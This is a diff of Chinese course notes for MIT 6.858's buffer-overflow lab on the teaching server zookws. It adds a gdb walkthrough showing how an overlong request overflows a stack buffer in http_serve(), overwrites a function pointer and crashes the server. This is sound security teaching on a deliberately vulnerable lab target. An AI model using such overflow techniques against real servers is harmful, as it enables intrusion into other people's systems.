@@ -495,17 +495,17 @@ pre.line-numbers > code {
 
 <body>
 
-<h1 id="toc_0">缓冲区溢出课程2：实验1</h1>
+<h1 id="toc_0">缓冲区溢出2：分析与触发</h1>
 
 <h3 id="toc_1">哈尔滨工业大学 网络与信息安全 张宇 2016</h3>
 
-<h3 id="toc_2">参考课程: <a href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm">MIT 6.858 Computer Systems Security</a> by Prof. Nickolai Zeldovich</h3>
+<p>参考课程: <a href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm">MIT 6.858 Computer Systems Security</a> by Prof. Nickolai Zeldovich</p>
 
 <p>实验资料见<a href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm">MIT 6.858 Computer Systems Security</a>中Lab 1。</p>
 
 <p>本实验中，我们通过缓冲区溢出漏洞来攻击一个web服务器<code>zookws</code>。该服务器上运行一个Python的web应用<code>zoobar</code>，用户之间转移一种称为“zoobars”的货币。</p>
 
-<h3 id="toc_3">准备实验环境</h3>
+<h3 id="toc_2">准备实验环境</h3>
 
 <p>实验环境为Ubuntu，在VMware Player (VMware Fusion)虚拟机中运行。系统中有两个账号，<code>root</code>，口令6858，用来安装软件；<code>httpd</code>，口令6858，用来运行Web服务器和实验程序。</p>
 
@@ -529,18 +529,18 @@ pre.line-numbers > code {
 <li><code>/zoobar</code>目录：zoobar服务实现</li>
 </ul>
 
-<div><pre class="line-numbers"><code class="language-none">                    +-------+   
-                    |zookld |&lt;--- &quot;zook-*.conf&quot; 
-                    +---+---+                 
-                        |--------------+
+<div><pre class="line-numbers"><code class="language-none">                    +———————+   
+                    |zookld |&lt;——— &quot;zook-*.conf&quot; 
+                    +———+———+                 
+                        |——————————————+
                         |              |
-+------+    HTTP    +---V---+      +---V---+     
-|client| &lt;--------&gt; |zookd  |&lt;----&gt;|zookfs |&lt;--- &quot;/zoobar&quot;
-+------+            +---^---+      +---^---+     
++——————+    HTTP    +———V———+      +———V———+     
+|client| &lt;————————&gt; |zookd  |&lt;————&gt;|zookfs |&lt;——— &quot;/zoobar&quot;
++——————+            +———^———+      +———^———+     
                         |              | (2) http_request_headers()
-(1) http_request_line() |   +------+   | (3) http_serve()
-                        +---| http |---+
-                            +------+</code></pre></div>
+(1) http_request_line() |   +——————+   | (3) http_serve()
+                        +———| http |———+
+                            +——————+</code></pre></div>
 
 <p>服务器端采用CGI (Common Gateway Interface)技术，将客户端请求URL映射到脚本或者普通HTML文件。CGI脚本可以由任意程序语言实现，脚本只需将HTTP头部和HTML文档输出到标准输出。本例CGI由<code>/zoobar</code>目录中的python脚本实现。目前，我们不需要关心具体zoobar服务内容。</p>
 
@@ -559,7 +559,7 @@ httpd     4448  2493  0 15:44 pts/3    S+     0:00 /home/httpd/lab/zookld zook-e
 httpd     4453  4448  0 15:44 pts/3    S+     0:00 zookd-exstack 5
 httpd     4454  4448  0 15:44 pts/3    S+     0:00 zookfs-exstack 6</code></pre></div>
 
-<h3 id="toc_4">练习1：寻找缓冲区溢出漏洞</h3>
+<h3 id="toc_3">练习1：寻找缓冲区溢出漏洞</h3>
 
 <p>需要研究服务器代码找到 <strong>至少5处</strong> 缓冲区溢出漏洞。</p>
 
@@ -663,7 +663,7 @@ http.c:344:    strcpy(dst, dirname);</code></pre></div>
 
 <p><strong>问：</strong> 如何利用这一漏洞？远程用户是否能够直接触发这一漏洞？</p>
 
-<h3 id="toc_5">练习2：触发缓冲区溢出漏洞</h3>
+<h3 id="toc_4">练习2：触发缓冲区溢出漏洞</h3>
 
 <p>本练习中每个人挑选两个缓冲区溢出漏洞。首先，该漏洞必须能改写栈中的一个返回地址；其次，改写一些数据结构来用于夺取程序的控制流。撰写触发该漏洞的程序，并验证改程序可以导致web服务器崩溃（通过<code>dmesg | tail</code>, 使用<code>gdb</code>, 或直接观察）。</p>
 
@@ -771,12 +771,13 @@ PASS ./exploit-2b.py</code></pre></div>
 
 <p>当生成子进程时，<code>gdb</code>缺省情况下仍然调试父进程，而不会跟踪子进程。由于<code>zookfs</code>为每个服务请求生成一个子进程，为了自动跟踪子进程，使用<code>set follow-fork-mode child</code>命令。该命令已经被加入<code>/home/httpd/lab/.gdbinit</code>中，<code>gdb</code>启动时会自动执行。</p>
 
-<p>在终端1中，重启服务：<code>$ ./clean-env.sh ./zookld zook-exstack.conf</code>。</p>
+<p>在终端1中，重启服务：
+<code>$ ./clean-env.sh ./zookld zook-exstack.conf</code>。
+在终端2中，启动<code>gdb</code>。在设置断点后，在终端3中，运行漏洞触发程序<code>./exploit-2a.py localhost 8080</code>。</p>
 
-<p>在终端2中，启动<code>gdb</code>：<code>$ gdb -p $(pgrep zookd-exstack)</code>。
-在设置断点后，在终端3中，运行漏洞触发程序<code>./exploit-2a.py localhost 8080</code>。</p>
-
-<div><pre class="line-numbers"><code class="language-bash">(gdb) b http_request_line
+<div><pre class="line-numbers"><code class="language-bash">$ gdb -p $(pgrep zookd-exstack)
+...
+(gdb) b http_request_line
 Breakpoint 1 at 0x8049150: file http.c, line 67.
 [运行漏洞触发程序]
 (gdb) c
@@ -811,14 +812,124 @@ warning: Source file is more recent than executable.
 0xbffff211:     &quot;&quot;
 0xbffff212:     &quot;&quot;
 0xbffff213:     &quot;&quot;
- x/10s buf
- 
- p reqpath
- x/10 env</code></pre></div>
+(gdb) p sizeof reqpath  [reqpath不会溢出]
+$3 = 2048
+(gdb) p sizeof env      [env不会溢出]
+$4 = 8192
+[继续用n命令执行]
+85          if (sendfd(svcfds[i], env, env_len, fd) &lt;= 0)
+[此时zookd将请求发送给zookfs]
+(gdb) quit</code></pre></div>
 
-<h2 id="toc_6">课程3：Shellcode与代码注入</h2>
+<p><code>zookd</code>此时并不存在缓冲区溢出，接下来分析<code>zookfs</code>。在<code>zookfs.c</code>中，<code>http_serve()</code>函数以<code>REQUEST_URI</code>环境变量为参数。在<code>http_serve</code>处设置断点，分析栈结构。</p>
 
-<h3 id="toc_7">一个Shellcode例子</h3>
+<div><pre class="line-numbers"><code class="language-bash">$ gdb -p $(pgrep zookfs-exstack)
+...
+(gdb) b http_serve
+Breakpoint 1 at 0x804951c: file http.c, line 275.
+[运行漏洞触发程序]
+gdb) c
+Continuing.
+[New process 5076]
+[Switching to process 5076]
+
+Breakpoint 1, http_serve (fd=3, name=0x80510b4 &quot;/&quot;, &#39;A&#39; &lt;repeats 199 times&gt;...) at http.c:275
+warning: Source file is more recent than executable.
+275         void (*handler)(int, const char *) = http_serve_none;
+(gdb) p $ebp
+$1 = (void *) 0xbfffde08
+(gdb) p &amp;handler
+$2 = (void (**)(int, const char *)) 0xbfffddfc
+(gdb) p &amp;pn
+$3 = (char (*)[1024]) 0xbfffd9fc
+(gdb) p &amp;st
+$4 = (struct stat *) 0xbfffd9a4
+(gdb) p &amp;fd
+$5 = (int *) 0xbfffde10
+(gdb) P &amp;name
+$6 = (const char **) 0xbfffde14
+(gdb) x $ebp+4
+0xbfffde0c:     0x08048d86</code></pre></div>
+
+<p>根据上面的调试信息绘制<code>http_serve()</code>的栈结构：</p>
+
+<div><pre class="line-numbers"><code class="language-none">+———————————————————————-+   
+|          name          |&lt;——— (+12)   =0xbfffde14       
++———————————————————————-+   
+|        fd = 3          |&lt;——— (+8)    =0xbfffde10                                  
++———————————————————————-+                                 
+|     return address     |&lt;——— (+4)    =0xbfffde0c 
++———————————————————————-+                             
+|          ebp           |&lt;——— (0)     =0xbfffde08
++———————————————————————-+
+|                        |
++————————————————————————+
+|    void (*handler)     |&lt;——— (-12)   =0xbfffddfc
++————————————————————————+
+|pn[1023]   ^            |
+|           |            |
+|           |       pn[0]|&lt;——— (-1036) =0xbfffd9fc
++————————————————————————+
+|    struct stat st      | 
+|       (88bytes)        |&lt;——— (-1124) =0xbfffd9a4
++———————————————————————-+
+</code></pre></div>
+
+<p>继续执行，</p>
+
+<div><pre class="line-numbers"><code class="language-bash">(gdb) n
+279         getcwd(pn, sizeof(pn));
+(gdb) n
+280         setenv(&quot;DOCUMENT_ROOT&quot;, pn, 1);
+(gdb) n
+282         strcat(pn, name);
+(gdb) p pn
+$7 = &quot;/home/httpd/lab\000&quot;, &#39;A&#39; &lt;repeats 504 times&gt;...
+(gdb) p strlen(name)
+$8 = 1025
+(gdb) p sizeof pn
+$9 = 1024</code></pre></div>
+
+<p>此处将执行<code>strcat()</code>，在<code>pn</code>中已经包含的来自<code>getcwd()</code>的字符串后面加上长度1025的<code>name</code>，将超过<code>pn</code>所分配的大小1024，导致缓冲区溢出。接着执行一步，并查看缓冲区溢出情况。</p>
+
+<div><pre class="line-numbers"><code class="language-bash">(gdb) n
+283         split_path(pn);
+(gdb) x/10s pn
+0xbfffd9fc:     &quot;/home/httpd/lab/&quot;, &#39;A&#39; &lt;repeats 184 times&gt;...
+0xbfffdac4:     &#39;A&#39; &lt;repeats 200 times&gt;...
+0xbfffdb8c:     &#39;A&#39; &lt;repeats 200 times&gt;...
+0xbfffdc54:     &#39;A&#39; &lt;repeats 200 times&gt;...
+0xbfffdd1c:     &#39;A&#39; &lt;repeats 200 times&gt;...
+0xbfffdde4:     &#39;A&#39; &lt;repeats 40 times&gt;
+0xbfffde0d:     &quot;\215\004\b\003&quot;
+0xbfffde12:     &quot;&quot;
+0xbfffde13:     &quot;&quot;
+0xbfffde14:     &quot;\264\020\005\b&quot;
+(gdb) x &amp;handler
+0xbfffddfc:     &#39;A&#39; &lt;repeats 16 times&gt;
+(gdb) x $ebp
+0xbfffde08:     &quot;AAAA&quot;
+(gdb) x $ebp+4
+0xbfffde0c:     &quot;&quot;
+</code></pre></div>
+
+<p>在<code>pn</code>之前的缓冲区，包括<code>handler</code>和<code>$ebp</code>，已经被字符<code>A</code>覆盖。返回地址也写入了0。</p>
+
+<div><pre class="line-numbers"><code class="language-bash">(gdb) n
+285         if (!stat(pn, &amp;st))
+(gdb) n
+296         handler(fd, pn);
+(gdb) n
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) bt
+#0  0x41414141 in ?? ()
+#1  0x080495e8 in http_serve (fd=3, name=0x80510b4 &quot;/&quot;, &#39;A&#39; &lt;repeats 199 times&gt;...) at http.c:296
+#2  0x08048d00 in main (argc=&lt;error reading variable: Cannot access memory at address 0x41414149&gt;,
+    argv=&lt;error reading variable: Cannot access memory at address 0x4141414d&gt;) at zookfs.c:39</code></pre></div>
+
+<p>继续执行到<code>handler(fd, pn);</code>，由于<code>handler</code>变量被改写为<code>0x41414141</code>，导致程序崩溃。这个示例并没有利用改写返回地址来劫持控制流。</p>
 
 
 
